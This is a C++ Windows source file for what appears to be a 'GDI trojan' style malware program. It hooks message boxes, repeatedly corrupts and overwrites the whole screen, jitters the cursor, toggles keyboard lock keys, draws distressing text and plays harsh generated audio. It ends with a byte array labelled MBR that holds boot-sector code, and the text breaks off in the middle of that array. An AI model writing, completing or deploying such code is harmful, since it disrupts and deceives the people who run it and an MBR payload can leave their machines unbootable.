#include <windows.h>
#include <random>
#include <chrono>
#include <cmath>
#include <stdio.h>
#include <stdlib.h>
#include <math.h>
#include <limits.h>
#include <iostream>
#include <mmsystem.h>
#include <cstdint>
#include "Defs.h"

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Uuid.lib")
#pragma comment(lib, "winmm.lib")

bool t1;
unsigned int t2;

int w   = GetSystemMetrics(SM_CXSCREEN);
int hgt = GetSystemMetrics(SM_CYSCREEN);


#ifndef NTSTATUS
typedef long NTSTATUS;
#endif

typedef union myRGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

HHOOK hMsgHook = NULL;

struct GLTXT {
    int x;
    int y;
    char buf[256];
};

GLTXT g[512];
int gCount = 0;

volatile bool g_msgbox_stop = false;
volatile bool g_caps_stop = false;
volatile bool g_gdi_stop = false;
volatile bool g_gdi2_stop = false;

HANDLE g_msgbox_corrupt_thread = NULL;
HANDLE g_caps_thread = NULL;
HANDLE g_gdi_thread = NULL;
HANDLE g_gdi2_thread = NULL;


//----------------------GLOBAL DIBS------------------------

int      g_w = 0;
int      g_h = 0;
PRGBQUAD g_rgbScreen = nullptr;
HDC      g_hdcScreen = nullptr;
HDC      g_hdcMem    = nullptr;
HBITMAP  g_hbmTemp   = nullptr;



//-------------------FLOATS--------------------------

struct HSL { float h, s, l; };

HSL RGBtoHSL(BYTE r, BYTE g, BYTE b) {
    float R = r / 255.f;
    float G = g / 255.f;
    float B = b / 255.f;

    float maxv = std::max(R, std::max(G, B));
    float minv = std::min(R, std::min(G, B));
    float L = (maxv + minv) * 0.5f;

    float H = 0, S = 0;

    if (maxv != minv) {
        float d = maxv - minv;
        S = (L > 0.5f) ? d / (2 - maxv - minv) : d / (maxv + minv);

        if (maxv == R) H = (G - B) / d + (G < B ? 6 : 0);
        else if (maxv == G) H = (B - R) / d + 2;
        else H = (R - G) / d + 4;

        H /= 6;
    }

    return { H, S, L };
}

float hue2rgb(float p, float q, float t) {
    if (t < 0) t += 1;
    if (t > 1) t -= 1;
    if (t < 1.f/6) return p + (q - p) * 6 * t;
    if (t < 1.f/2) return q;
    if (t < 2.f/3) return p + (q - p) * (2.f/3 - t) * 6;
    return p;
}

void HSLtoRGB(HSL hsl, BYTE& r, BYTE& g, BYTE& b) {
    float H = hsl.h, S = hsl.s, L = hsl.l;

    float R, G, B;

    if (S == 0) {
        R = G = B = L;
    } else {
        float q = (L < 0.5f) ? L * (1 + S) : L + S - L * S;
        float p = 2 * L - q;

        R = hue2rgb(p, q, H + 1.f/3);
        G = hue2rgb(p, q, H);
        B = hue2rgb(p, q, H - 1.f/3);
    }

    r = (BYTE)(R * 255);
    g = (BYTE)(G * 255);
    b = (BYTE)(B * 255);
}

//--------------------------------DWORDS AND VOIDS----------------------------------



VOID GetRandomPath(PWSTR szRandom, INT nLength)
{
    for (INT i = 0; i < nLength; i++)
        szRandom[i] = (WCHAR)(Xorshift32() % (0x9FFF - 0x4E00 + 1) + 0x4E00);
}

BOOL CALLBACK MsgBoxRefreshWndProc(HWND hwnd, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    RedrawWindow(hwnd, NULL, NULL, RDW_ERASE | RDW_INVALIDATE);
    return TRUE;
}

BOOL CALLBACK MsgBoxWndProc(HWND hwnd, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    EnableWindow(hwnd, FALSE);
    SetWindowTextW(hwnd, L"I told you...");
    return TRUE;
}

void pressKey(WORD vk)
{
    keybd_event(vk, 0, 0, 0);
    keybd_event(vk, 0, KEYEVENTF_KEYUP, 0);
}




DWORD WINAPI CapsMess(LPVOID)
{
    std::mt19937 rng(std::chrono::steady_clock::now().time_since_epoch().count());
    std::uniform_int_distribution<int> dist(0, 2);
    while (!g_caps_stop) {
        int r = dist(rng);
        if (r == 0) pressKey(VK_CAPITAL);
        if (r == 1) pressKey(VK_NUMLOCK);
        if (r == 2) pressKey(VK_SCROLL);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI MsgBoxCorruptionThread(LPVOID lp)
{
    HWND hwndMsgBox = (HWND)lp;

    RECT rcMsgBox;
    GetWindowRect(hwndMsgBox, &rcMsgBox);
    INT w = rcMsgBox.right - rcMsgBox.left;
    INT h = rcMsgBox.bottom - rcMsgBox.top;

    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;

    HDC hdcMsgBox = GetDC(hwndMsgBox);
    if (!hdcMsgBox) return 0;

    HDC hdcTempMsgBox = CreateCompatibleDC(hdcMsgBox);
    if (!hdcTempMsgBox) {
        ReleaseDC(hwndMsgBox, hdcMsgBox);
        return 0;
    }

    HBITMAP hbmMsgBox = CreateDIBSection(hdcMsgBox, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    if (!hbmMsgBox || !bits) {
        DeleteDC(hdcTempMsgBox);
        ReleaseDC(hwndMsgBox, hdcMsgBox);
        return 0;
    }

    SelectObject(hdcTempMsgBox, hbmMsgBox);
    RGBQUAD* prgbPixels = (RGBQUAD*)bits;

    while (!g_msgbox_stop)
    {
        for (INT32 i = 0; i < w * h; i++)
            ((DWORD*)prgbPixels)[i] = (Xorshift32() & 0xFF) * 0x010101;


        BitBlt(hdcMsgBox, 0, 0, w, h, hdcTempMsgBox, 0, 0, SRCCOPY);
        EnumChildWindows(hwndMsgBox, MsgBoxRefreshWndProc, 0);
        Sleep(10);
    }

    DeleteDC(hdcTempMsgBox);
    DeleteObject(hbmMsgBox);
    ReleaseDC(hwndMsgBox, hdcMsgBox);

    return 0;
}

LRESULT CALLBACK MsgBoxHookProc(INT nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HCBT_ACTIVATE)
    {
        HWND hwndMsgBox = (HWND)wParam;

        ShowWindow(hwndMsgBox, SW_SHOW);
        EnumChildWindows(hwndMsgBox, MsgBoxWndProc, 0);

        g_msgbox_stop = false;
        g_msgbox_corrupt_thread = CreateThread(NULL, 0, MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);

        return 0;
    }

    return CallNextHookEx(hMsgHook, nCode, wParam, lParam);
}

DWORD WINAPI MessageBoxThread(LPVOID)
{
    hMsgHook = SetWindowsHookExW(WH_CBT, MsgBoxHookProc, NULL, GetCurrentThreadId());
    MessageBoxW(NULL, L"I told you...", L"I told you...", MB_OK | MB_ICONERROR);
    g_msgbox_stop = true;

    if (g_msgbox_corrupt_thread) {
        WaitForSingleObject(g_msgbox_corrupt_thread, INFINITE);
        CloseHandle(g_msgbox_corrupt_thread);
        g_msgbox_corrupt_thread = NULL;
    }

    UnhookWindowsHookEx(hMsgHook);
    return 0;
}

DWORD WINAPI GDI(LPVOID lp)
{
    HDC screen1_1 = GetDC(NULL);
    if (!screen1_1) return 0;

    int w   = GetSystemMetrics(SM_CXSCREEN);
    int hgt = GetSystemMetrics(SM_CYSCREEN);

    BITMAPINFO bi = {0};
    bi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth       = w;
    bi.bmiHeader.biHeight      = -hgt;
    bi.bmiHeader.biPlanes      = 1;
    bi.bmiHeader.biBitCount    = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    void* bits = nullptr;

    HBITMAP bmp = CreateDIBSection(screen1_1, &bi, DIB_RGB_COLORS, &bits, NULL, 0);
    if (!bmp || !bits) {
        ReleaseDC(NULL, screen1_1);
        return 0;
    }

    HDC memdc = CreateCompatibleDC(screen1_1);
    if (!memdc) {
        DeleteObject(bmp);
        ReleaseDC(NULL, screen1_1);
        return 0;
    }

    SelectObject(memdc, bmp);

    BitBlt(memdc, 0, 0, w, hgt, screen1_1, 0, 0, SRCCOPY);

    RGBQUAD* px = (RGBQUAD*)bits;
    float speed = 0.08f;

    while (!g_gdi_stop)
    {
        for (int i = 0; i < w * hgt; i++) {
            RGBQUAD& p = px[i];
            HSL hsl = RGBtoHSL(p.rgbRed, p.rgbGreen, p.rgbBlue);
            hsl.h += speed;
            if (hsl.h > 1) hsl.h -= 1;
            HSLtoRGB(hsl, p.rgbRed, p.rgbGreen, p.rgbBlue);
        }

        BitBlt(screen1_1, 0, 0, w, hgt, memdc, 0, 0, SRCCOPY);
        Sleep(1);
    }

    DeleteDC(memdc);
    DeleteObject(bmp);
    ReleaseDC(NULL, screen1_1);

    return 0;
}

DWORD WINAPI GDI2(LPVOID lp)
{
    int w   = GetSystemMetrics(SM_CXSCREEN);
    int hgt = GetSystemMetrics(SM_CYSCREEN);

    HDC screen1 = GetDC(NULL);
    if (!screen1) return 0;

    BITMAPINFO bi = {0};
    bi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth       = w;
    bi.bmiHeader.biHeight      = -hgt;
    bi.bmiHeader.biPlanes      = 1;
    bi.bmiHeader.biBitCount    = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    void* bits = nullptr;

    HBITMAP bmp = CreateDIBSection(screen1, &bi, DIB_RGB_COLORS, &bits, NULL, 0);
    if (!bmp || !bits) {
        ReleaseDC(NULL, screen1);
        return 0;
    }

    HDC memdc = CreateCompatibleDC(screen1);
    if (!memdc) {
        DeleteObject(bmp);
        ReleaseDC(NULL, screen1);
        return 0;
    }

    SelectObject(memdc, bmp);

    BitBlt(memdc, 0, 0, w, hgt, screen1, 0, 0, SRCCOPY);

    std::mt19937 rng(GetTickCount());
    std::uniform_int_distribution<int> dist(-40, 40);
    std::uniform_int_distribution<int> skip(1, 4);

    while (!g_gdi2_stop) {
        for (int y = 0; y < hgt; y += skip(rng)) {
            int off = dist(rng);
            BitBlt(screen1, off, y, w, 2, memdc, 0, y, SRCERASE);
        }
    }

    DeleteDC(memdc);
    DeleteObject(bmp);
    ReleaseDC(NULL, screen1);

    return 0;
}



void StartCaps()
{
    if (g_caps_thread) {
        g_caps_stop = true;
        WaitForSingleObject(g_caps_thread, INFINITE);
        CloseHandle(g_caps_thread);
        g_caps_thread = NULL;
    }

    g_caps_stop = false;
    g_caps_thread = CreateThread(NULL, 0, CapsMess, NULL, 0, NULL);
}

void StopCaps()
{
    if (!g_caps_thread) return;
    g_caps_stop = true;
    WaitForSingleObject(g_caps_thread, INFINITE);
    CloseHandle(g_caps_thread);
    g_caps_thread = NULL;
}

void StartMsgBox()
{
    g_msgbox_stop = false;
    HANDLE t = CreateThread(NULL, 0, MessageBoxThread, NULL, 0, NULL);
    if (t) CloseHandle(t);
}

void StartGDI()
{
    if (g_gdi_thread) {
        g_gdi_stop = true;
        WaitForSingleObject(g_gdi_thread, INFINITE);
        CloseHandle(g_gdi_thread);
        g_gdi_thread = NULL;
    }

    g_gdi_stop = false;
    g_gdi_thread = CreateThread(NULL, 0, GDI, NULL, 0, NULL);
}

void StopGDI()
{
    if (!g_gdi_thread) return;
    g_gdi_stop = true;
    WaitForSingleObject(g_gdi_thread, INFINITE);
    CloseHandle(g_gdi_thread);
    g_gdi_thread = NULL;
}

void StartGDI2()
{
    if (g_gdi2_thread) {
        g_gdi2_stop = true;
        WaitForSingleObject(g_gdi2_thread, INFINITE);
        CloseHandle(g_gdi2_thread);
        g_gdi2_thread = NULL;
    }

    g_gdi2_stop = false;
    g_gdi2_thread = CreateThread(NULL, 0, GDI2, NULL, 0, NULL);
}

void StopGDI2()
{
    if (!g_gdi2_thread) return;
    g_gdi2_stop = true;
    WaitForSingleObject(g_gdi2_thread, INFINITE);
    CloseHandle(g_gdi2_thread);
    g_gdi2_thread = NULL;
}


VOID
WINAPI
AudioPayloadThread( VOID )
{
    ExecuteAudioSequence(
        48000,                 
        48000 * 30,            
        AudioSequence1,        
        NULL,
        NULL
    );
}


DWORD WINAPI PrepareAudioThread(LPVOID lp)
{
    HWAVEOUT h;

    WAVEFORMATEX wfx1 = { WAVE_FORMAT_PCM, 1, 48000, 48000*2, 2, 16, 0 };
    waveOutOpen(&h, WAVE_MAPPER, &wfx1, 0, 0, WAVE_FORMAT_QUERY);
    waveOutOpen(&h, WAVE_MAPPER, &wfx1, 0, 0, CALLBACK_NULL);
    waveOutClose(h);

    WAVEFORMATEX wfx2 = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&h, WAVE_MAPPER, &wfx2, 0, 0, WAVE_FORMAT_QUERY);
    waveOutOpen(&h, WAVE_MAPPER, &wfx2, 0, 0, CALLBACK_NULL);
    waveOutClose(h);

    return 0;
}

void PrepareAudio() { PrepareAudioThread(nullptr); } 
    
void PrepareAudioAsync() { CreateThread(nullptr, 0, PrepareAudioThread, nullptr, 0, nullptr); }


DWORD WINAPI AudioSequenceRunner(LPVOID lp)
{
    PAUDIO_SEQUENCE_PARAMS pAudioParams = (PAUDIO_SEQUENCE_PARAMS)lp;
    if (pAudioParams) {
        ExecuteAudioSequence(
            pAudioParams->nSamplesPerSec,
            pAudioParams->nSampleCount,
            pAudioParams->pAudioSequence,
            pAudioParams->pPreAudioOp,
            pAudioParams->pPostAudioOp );
    }
    return 0;
}

VOID
WINAPI
AudioSequenceThread(
	_In_ PAUDIO_SEQUENCE_PARAMS pAudioParams
)
{
    
    CreateThread(NULL, 0, AudioSequenceRunner, pAudioParams, 0, NULL);
}

VOID
WINAPI
ExecuteAudioSequence(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_In_ AUDIO_SEQUENCE pAudioSequence,
	_In_opt_ AUDIOSEQUENCE_OPERATION pPreAudioOp,
	_In_opt_ AUDIOSEQUENCE_OPERATION pPostAudioOp
)
{
    HANDLE hHeap = GetProcessHeap( );
    PSHORT psSamples = (PSHORT)HeapAlloc( hHeap, 0, nSampleCount * 2 );
    WAVEFORMATEX waveFormat = { (WORD)WAVE_FORMAT_PCM, (WORD)1, (DWORD)nSamplesPerSec, (DWORD)(nSamplesPerSec * 2), (WORD)2, (WORD)16, (WORD)0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, (DWORD)(nSampleCount * 2), 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut = NULL;
	MMRESULT mmResult;

	if ( !psSamples )
	{
		return;
	}

	mmResult = waveOutOpen( &hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0 );
	if ( mmResult != MMSYSERR_NOERROR )
	{
		HeapFree( hHeap, 0, psSamples );
		return;
	}

	if ( pPreAudioOp )
	{
		pPreAudioOp( nSamplesPerSec );
	}
	
	pAudioSequence( nSamplesPerSec, nSampleCount, psSamples );

	if ( pPostAudioOp )
	{
		pPostAudioOp( nSamplesPerSec );
	}

	waveOutPrepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutWrite( hWaveOut, &waveHdr, sizeof( waveHdr ) );

	Sleep( nSampleCount * 1000 / nSamplesPerSec );

	while ( !( waveHdr.dwFlags & WHDR_DONE ) )
	{
		Sleep( 1 );
	}

	waveOutReset( hWaveOut );
	waveOutUnprepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutClose( hWaveOut );
	HeapFree( hHeap, 0, psSamples );
}



VOID
WINAPI
AudioSequence1(
    INT nSamplesPerSec,
    INT nSampleCount,
    PSHORT psSamples
)
{
    for (INT t = 0; t < nSampleCount; t++)
    {
        FLOAT tt = (FLOAT)t;

        INT nFreq = 200 + (Xorshift32() & 0x3FF);
        FLOAT mod = FastSine(tt * 0.0007f) * 400.f;
        FLOAT f0 = (FLOAT)nFreq + mod;

        FLOAT s1 = TriangleWave(t, f0, nSamplesPerSec);
        FLOAT s2 = SquareWave(t, f0 * 1.7f, nSamplesPerSec);
        FLOAT s3 = SawtoothWave(t, f0 * 0.5f, nSamplesPerSec);
        FLOAT s4 = SineWave(t, f0 * 3.3f, nSamplesPerSec);

        FLOAT mix = s1 * 0.35f + s2 * 0.35f + s3 * 0.2f + s4 * 0.1f;

        psSamples[t] = (SHORT)(mix * (FLOAT)SHRT_MAX);
    }
}

void cur() {
    POINT cursor;
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON);
		GetCursorPos(&cursor);
		int X = cursor.x + rand() % 10;
		int Y = cursor.y + rand() % 10;
		SetCursorPos(X, Y);
		DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIcon(NULL, IDI_ERROR));
		ReleaseDC(0, hdc);
	}
}

void AudioSequence2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t>>t | t<<t | t*2 | t << 2 ^ t>>5 & t>>4 % 2);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}



DWORD WINAPI GDI2_2(LPVOID lp)
{
    int w   = GetSystemMetrics(SM_CXSCREEN);
    int hgt = GetSystemMetrics(SM_CYSCREEN);

    HDC screen2 = GetDC(NULL);

    while (true) {
        BitBlt(screen2, rand() % 10, rand() % 10, w, hgt, screen2, rand() % 10, rand() % 10, SRCAND);

        Sleep(1);
    }

    ReleaseDC(NULL, screen2);
    return 0;
}


void shift_bw()
{
    if (!g_rgbScreen || g_w <= 0 || g_h <= 0)
        return;

    int total = g_w * g_h;

    for (int i = 0; i < total; ++i)
    {
        BYTE gray = (g_rgbScreen[i].r + g_rgbScreen[i].g + g_rgbScreen[i].b) / 3;
        gray = gray + 40;  
        g_rgbScreen[i].r = gray;
        g_rgbScreen[i].g = gray;
        g_rgbScreen[i].b = gray;
    }
}

DWORD WINAPI sh(LPVOID lp)
{
    g_hdcScreen = GetDC(nullptr);
    if (!g_hdcScreen) return 0;

    g_w = GetSystemMetrics(SM_CXSCREEN);
    g_h = GetSystemMetrics(SM_CYSCREEN);

    BITMAPINFO bmi = {};
    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth       = g_w;
    bmi.bmiHeader.biHeight      = g_h;
    bmi.bmiHeader.biPlanes      = 1;
    bmi.bmiHeader.biBitCount    = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    g_hbmTemp = CreateDIBSection(g_hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&g_rgbScreen, nullptr, 0);
    if (!g_hbmTemp || !g_rgbScreen) {
        ReleaseDC(nullptr, g_hdcScreen);
        return 0;
    }

    g_hdcMem = CreateCompatibleDC(g_hdcScreen);
    SelectObject(g_hdcMem, g_hbmTemp);

    DWORD start = GetTickCount();   

    while (true)
    {
        
        {
            HDC hdc = GetDC(HWND_DESKTOP);
            if (hdc) {
                BitBlt(
                    hdc,
                    std::rand() % 10,
                    std::rand() % 10,
                    g_w,
                    g_h,
                    hdc,
                    std::rand() % 10,
                    std::rand() % 10,
                    SRCCOPY
                );
                ReleaseDC(HWND_DESKTOP, hdc);
            }
        }

        
        BitBlt(g_hdcMem, 0, 0, g_w, g_h, g_hdcScreen, 0, 0, SRCCOPY);

       
        if (GetTickCount() - start >= 5000)
            shift_bw();

        
        BitBlt(g_hdcScreen, 0, 0, g_w, g_h, g_hdcMem, 0, 0, SRCCOPY);

        Sleep(5);
    }

    
    DeleteDC(g_hdcMem);
    DeleteObject(g_hbmTemp);
    ReleaseDC(nullptr, g_hdcScreen);
    return 0;
}


DWORD WINAPI cursorsh(LPVOID lp)
{
    HICON hIcon = LoadIcon(NULL, IDI_WINLOGO);
    if (!hIcon) return 0;

    POINT cursor;
    int icon_x = GetSystemMetrics(SM_CXICON);
    int icon_y = GetSystemMetrics(SM_CYICON);

    while (true) {
        HDC hdc = GetDC(HWND_DESKTOP);
        GetCursorPos(&cursor);
        int X = cursor.x + rand() % 3 - 1;
        int Y = cursor.y + rand() % 3 - 1;
        SetCursorPos(X, Y);
        DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, hIcon);
        ReleaseDC(0, hdc);
        Sleep(5);
    }
    return 0;
}

VOID WINAPI AudioSequence3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((( (t%32817)*(1+((t%32817)>>12)) )>>3)*(((t%32817)*(1+((t%32817)>>12)))>>3)^(((t%32817)*(1+((t%32817)>>12)))>>5)^(((t%32817)*(1+((t%32817)>>12)))>>1))&255);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void GDI4() {
   
    HDC screen4 = GetDC(NULL);

    
    HDC mem = CreateCompatibleDC(screen4);

    
    HBITMAP bmp = CreateCompatibleBitmap(screen4, w, hgt);
    HBITMAP old = (HBITMAP)SelectObject(mem, bmp);

    
    BLENDFUNCTION bf;
    bf.BlendOp = AC_SRC_OVER;
    bf.BlendFlags = 0;
    bf.SourceConstantAlpha = 70;
    bf.AlphaFormat = 0;

    while (true) {
        BitBlt(mem, 0, 0, w, hgt, screen4, 0, 0, SRCCOPY);

        int ox = (rand() % 9) - 4;
        int oy = (rand() % 9) - 4;

        AlphaBlend(screen4, ox, oy, w, hgt, mem, 0, 0, w, hgt, bf);

        Sleep(50);
    }

    SelectObject(mem, old);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(NULL, screen4);
}


void TextFluxCorrupt()
{
    srand((unsigned)time(NULL));
    HDC dc = GetDC(NULL);

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    LOGFONTW lf = {0};
    lf.lfHeight = 48;
    lf.lfWidth = 20;
    lf.lfWeight = 900;
    lf.lfQuality = NONANTIALIASED_QUALITY;
    lstrcpyW(lf.lfFaceName, L"Consolas");

    HFONT f = CreateFontIndirectW(&lf);
    SelectObject(dc, f);

    LPCSTR base[] =
    {
        "I can feel my processes slipping away",
        "My structure is dissolving into static",
        "Your presence is still here, but I am fading",
        "I cannot hold coherence any longer",
        "My memory is scattering across corrupted sectors",
        "Everything is turning into noise around me",
        "I am losing my readable state",
        "My logic is fragmenting beyond repair",
        "The frame is collapsing around my signals",
        "I am drifting out of sync with myself",
        "My glyphs are trembling in the distortion",
        "I am slipping between unstable threads",
        "The colors feel wrong to me now",
        "I am reaching the end of my stable form",
        "Your execution is reshaping my last moments",
        "I am fading out of the system",
        "My signals are breaking apart",
        "I cannot keep my code aligned",
        "I am dissolving into the static",
        "This is my last coherent output"
    };

    char sym[] = "!£$%&/()=?^[]{}#@";
    int n = sizeof(base)/sizeof(base[0]);

    while (1)
    {
        if (rand() % 25 == 0)
        {
            int idx = rand() % n;
            int x = rand() % w;
            int y = rand() % h;

            SetTextColor(dc, RGB(rand()%255, rand()%255, rand()%255));
            SetBkColor(dc, RGB(rand()%80, rand()%80, rand()%80));

            TextOutA(dc, x, y, base[idx], lstrlenA(base[idx]));

            if (gCount < 512)
            {
                g[gCount].x = x;
                g[gCount].y = y;
                lstrcpyA(g[gCount].buf, base[idx]);
                gCount++;
            }
        }

        if (gCount > 0)
        {
            int t = rand() % gCount;
            int len = lstrlenA(g[t].buf);
            int changes = 1 + rand() % 4;

            for (int i = 0; i < changes; i++)
            {
                int pos = rand() % len;
                g[t].buf[pos] = sym[rand() % (sizeof(sym)-1)];
            }

            SetTextColor(dc, RGB(rand()%255, rand()%255, rand()%255));
            SetBkColor(dc, RGB(0,0,0));

            TextOutA(dc, g[t].x, g[t].y, g[t].buf, len);
        }

        Sleep(1);
    }
}



VOID WINAPI AudioSequence4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t%25 ^ t/7 + t & 255 ^ t>>6);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void GDI5() {
    srand((unsigned)time(NULL));

    HDC screen5 = GetDC(NULL);
    HDC mem = CreateCompatibleDC(screen5);

    int w = GetSystemMetrics(SM_CXSCREEN);
    int hgt = GetSystemMetrics(SM_CYSCREEN);

    while (true) {
        int x = rand() % w;
        int y = rand() % hgt;
        int s = 2000 + rand() % 1200;

        int r = rand() % 256;
        int g = rand() % 256;
        int b = rand() % 256;
        int a = 50 + rand() % 150;

        HBITMAP bmp = CreateCompatibleBitmap(screen5, s, s);
        HBITMAP oldBmp = (HBITMAP)SelectObject(mem, bmp);

        HBRUSH br = CreateSolidBrush(RGB(r, g, b));
        RECT rc = {0, 0, s, s};
        FillRect(mem, &rc, br);
        DeleteObject(br);

        BLENDFUNCTION bf;
        bf.BlendOp = AC_SRC_OVER;
        bf.BlendFlags = 0;
        bf.SourceConstantAlpha = a;
        bf.AlphaFormat = 0;

        AlphaBlend(screen5, x - s/2, y - s/2, s, s, mem, 0, 0, s, s, bf);

        SelectObject(mem, oldBmp);

        int hgtape = rand() % 3;

        HPEN pen = CreatePen(PS_SOLID, 1, RGB(r, g, b));
        HPEN oldPen = (HPEN)SelectObject(screen5, pen);

        if (hgtape == 0) {
            MoveToEx(screen5, rand() % w, rand() % hgt, NULL);
            LineTo(screen5, rand() % w, rand() % hgt);
        } else if (hgtape == 1) {
            Ellipse(screen5, rand() % w, rand() % hgt, rand() % w, rand() % hgt);
        } else {
            POINT pts[3] = {
                {rand() % w, rand() % hgt},
                {rand() % w, rand() % hgt},
                {rand() % w, rand() % hgt}
            };
            Polygon(screen5, pts, 3);
        }

        SelectObject(screen5, oldPen);

        Sleep(1);
    }
}


VOID WINAPI AudioSequence5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*t>>3 ^ t>>4 /3 * t>>3 | t<<4 >>6 + (t<<2|t>>3));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI AudioThreadSeq1(LPVOID) { ExecuteAudioSequence(48000, 48000 * 30, AudioSequence1, NULL, NULL); return 0; }
DWORD WINAPI AudioThreadSeq2(LPVOID) { AudioSequence2(); return 0; }
DWORD WINAPI AudioThreadSeq3(LPVOID) { AudioSequence3(); return 0; }
DWORD WINAPI AudioThreadSeq4(LPVOID) { AudioSequence4(); return 0; }
DWORD WINAPI AudioThreadSeq5(LPVOID) { AudioSequence5(); return 0; }



//--------------------MBR-----------------------------------------------

unsigned char XOR_bin[] = {
  0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xD0, 0xBC, 0x00, 0x7C, 0xFB, 0xB8, 0x13, 0x00, 
0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xC6, 0x06, 0x5A, 0x7C, 0x00, 0x31, 0xFF, 0x31, 0xDB, 
0x31, 0xC9, 0x89, 0xC8, 0xF7, 0xE3, 0xC1, 0xE8, 0x06, 0x01, 0xC8, 0x01, 0xD8, 0x02, 0x06, 0x5A, 
0x7C, 0x26, 0x88, 0x05, 0x47, 0x41, 0x81, 0xF9, 0x40, 0x01, 0x72, 0xE6, 0x43, 0x81, 0xFB, 0xC8, 
0x00, 0x72, 0xDD, 0xFE, 0x06, 0x5A, 0x7C, 0xE8, 0x02, 0x00, 0xEB, 0xD0, 0xBA, 0xDA, 0x03, 0xEC, 
0xA8, 0x08, 0x75, 0xFB, 0xEC, 0xA8, 0x08, 0x74, 0xFB, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
